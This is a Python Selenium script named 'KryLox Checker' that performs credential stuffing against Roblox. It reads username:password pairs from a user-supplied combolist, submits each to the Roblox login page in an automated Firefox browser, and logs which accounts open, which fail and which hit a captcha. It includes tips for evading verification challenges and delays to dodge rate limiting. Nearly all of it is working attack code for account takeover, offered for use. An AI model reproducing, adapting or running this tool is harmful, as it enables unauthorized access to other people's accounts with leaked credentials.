from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import Fore
from time import sleep
import os

magenta = Fore.MAGENTA
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
reset = Fore.RESET

# Common timeout for WebDriverWait in seconds
COMMON_TIMEOUT = 10

WINDOW_SIZE = "1280,720"
options = FirefoxOptions()
options.add_argument(f"--window-size={WINDOW_SIZE}")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")


def initialize_driver():
    try:
        driver = webdriver.Firefox(options=options)
        driver.set_page_load_timeout(300)
        return driver
    except WebDriverException as e:
        print(f"[!] {red}WebDriver Error: {e}{reset}")
        return None


# Output files
success_file = "successful_logins.txt"
failed_file = "failed_logins.txt"
verification_file = "needs_verification.txt"

for file in [success_file, failed_file, verification_file]:
    with open(file, 'a') as f:
        pass

print(f"[*] {magenta}Connecting...{reset}")
sleep(3)
print(f"[*] {magenta}Connected!{reset}\n\n")

os.system("cls")
print(f"""{red}
$$\   $$\                     $$\                                 $$$$$$\  $$\                           $$\                           
$$ | $$  |                    $$ |                               $$  __$$\ $$ |                          $$ |                          
$$ |$$  /  $$$$$$\  $$\   $$\ $$ |      $$$$$$\  $$\   $$\       $$ /  \__|$$$$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\  $$$$$$\   $$$$$$\  
$$$$$  /  $$  __$$\ $$ |  $$ |$$ |     $$  __$$\ \$$\ $$  |      $$ |      $$  __$$\ $$  __$$\ $$  _____|$$ | $$  |$$  __$$\ $$  __$$\ 
$$  $$<   $$ |  \__|$$ |  $$ |$$ |     $$ /  $$ | \$$$$  /       $$ |      $$ |  $$ |$$$$$$$$ |$$ /      $$$$$$  / $$$$$$$$ |$$ |  \__|
$$ |\$$\  $$ |      $$ |  $$ |$$ |     $$ |  $$ | $$  $$<        $$ |  $$\ $$ |  $$ |$$   ____|$$ |      $$  _$$<  $$   ____|$$ |      
$$ | \$$\ $$ |      \$$$$$$$ |$$$$$$$$\\$$$$$$  |$$  /\$$\       \$$$$$$  |$$ |  $$ |\$$$$$$$\ \$$$$$$$\ $$ | \$$\ \$$$$$$$\ $$ |      
\__|  \__|\__|       \____$$ |\________|\______/ \__/  \__|       \______/ \__|  \__| \_______| \_______|\__|  \__| \_______|\__|      
                    $$\   $$ |                                                                                                         
                    \$$$$$$  |                                                                                                         
                     \______/                                
                            forked from:{yellow} XenonChecker | by{blue}: KryX0 
{reset}""")

print(f"[!] {red}NOTICE: Disable VPN/Proxy to potentially bypass verification challenges{reset}")
print(f"[!] {yellow}REMINDER: Ensure your Firefox browser is up to date for best performance{reset}\n")


comboName = str(input(f"{magenta}Combolist name: {reset}"))
try:
    with open(comboName + ".txt", "r") as file:
        combolist = file.readlines()
except FileNotFoundError:
    print(f"[!] {red}Error: File '{comboName}.txt' not found{reset}")
    exit(1)

print(f"[*] {magenta}Results will be saved to '{success_file}', '{failed_file}', and '{verification_file}'{reset}")

for combo in combolist:
    seq = combo.strip()
    if not seq or ':' not in seq:
        print(f"[!] {yellow}Skipping invalid line: {combo}{reset}")
        continue

    acc = seq.split(":")
    if len(acc) != 2:
        print(f"[!] {yellow}Invalid format: {combo}{reset}")
        continue

    username, password = acc[0], acc[1]

    driver = initialize_driver()
    if not driver:
        continue

    try:
        driver.get("https://www.roblox.com/Login")

        try:
            cookieBtn = WebDriverWait(driver, COMMON_TIMEOUT).until(  # Longer timeout for initial load
                EC.element_to_be_clickable(
                    (By.XPATH, "//*[contains(text(), 'Accept All')]"))
            )
            cookieBtn.click()
        except:
            print(
                f"[!] {yellow}Cookie button not found or timed out, continuing...{reset}")

        usernameInput = WebDriverWait(driver, COMMON_TIMEOUT//2).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )
        usernameInput.send_keys(username)

        passwordInput = WebDriverWait(driver, COMMON_TIMEOUT//2).until(
            EC.presence_of_element_located((By.NAME, "password"))
        )
        passwordInput.send_keys(password)

        lBtn = WebDriverWait(driver, COMMON_TIMEOUT).until(
            EC.element_to_be_clickable((By.ID, "login-button"))
        )
        lBtn.click()

        sleep(2)

       # Check for verification using <div class="challenge-captcha-body">
        try:
            verify_button = WebDriverWait(driver, COMMON_TIMEOUT).until(
                EC.presence_of_element_located((By.CLASS_NAME, "eZxMRy"))
            )
            button_text = verify_button.text.strip()
            if button_text == "Start Puzzle":
                print(f"[!] {yellow}VERIFICATION REQUIRED: {combo}{reset}")
                with open(verification_file, 'a') as f:
                    f.write(f"{combo} - Start Puzzle Verification\n")
            else:
                # If button exists but text isn't "Start Puzzle", treat as success or failure later
                raise Exception("Button found but text is not 'Start Puzzle'")
        except:
            # If no verification, check for login error
            try:
                WebDriverWait(driver, COMMON_TIMEOUT // 2).until(
                    EC.presence_of_element_located((By.ID, "login-form-error"))
                )
                print(f"[!] {red}BAD: {combo}{reset}")
                with open(failed_file, 'a') as f:
                    f.write(f"{combo}\n")
            except:
                # If neither verification nor error, assume success
                print(f"[!] {green}GOOD: {combo}{reset}")
                with open(success_file, 'a') as f:
                    f.write(f"{combo}\n")

    except TimeoutException:
        print(f"[!] {red}Timeout processing {combo}{reset}")
        with open(failed_file, 'a') as f:
            f.write(f"{combo} - Timeout Error\n")
    except Exception as e:
        print(f"[!] {red}Error processing {combo}: {e}{reset}")
        with open(failed_file, 'a') as f:
            f.write(f"{combo} - Error: {str(e)}\n")
    finally:
        try:
            driver.quit()
        except:
            pass

    sleep(3)  # delay to avoid rate limiting

print(f"\n\n{magenta}[*] Done!{reset}")
print(f"[*] {green}Successful logins saved to: {success_file}{reset}")
print(f"[*] {red}Failed logins saved to: {failed_file}{reset}")
print(f"[*] {yellow}Accounts needing verification saved to: {verification_file}{reset}")
